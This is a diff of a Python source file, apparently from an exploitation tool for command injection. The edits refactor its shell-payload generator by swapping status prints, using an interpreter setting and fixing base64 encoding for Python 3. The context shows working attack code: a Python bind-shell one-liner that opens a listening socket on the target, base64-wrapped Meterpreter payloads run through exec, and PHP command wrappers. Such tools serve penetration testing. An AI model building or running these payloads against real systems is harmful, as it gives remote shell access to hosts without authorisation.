@@ -274,7 +274,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -291,7 +291,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
 
       break
 
@@ -318,7 +318,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
 
     # Python-bind-shell
     elif other_shell == '4':
-      other_shell = "python -c 'import pty,os,socket%0d" \
+      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import pty,os,socket%0d" \
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                     "s.bind((\"\"," + settings.LPORT + "))%0d" \
                     "s.listen(1)%0d" \
@@ -365,7 +365,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -382,7 +382,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
       break
 
     # Python-bind-shell(meterpreter)
@@ -408,9 +408,9 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
         with open (output, "r") as content_file:
           data = content_file.readlines()
           data = ''.join(data)
-          data = base64.b64encode(data)
+          data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -424,10 +424,10 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           set_python_working_dir()
           other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
         else:
-          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
       break
     # Check for available shell options  
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
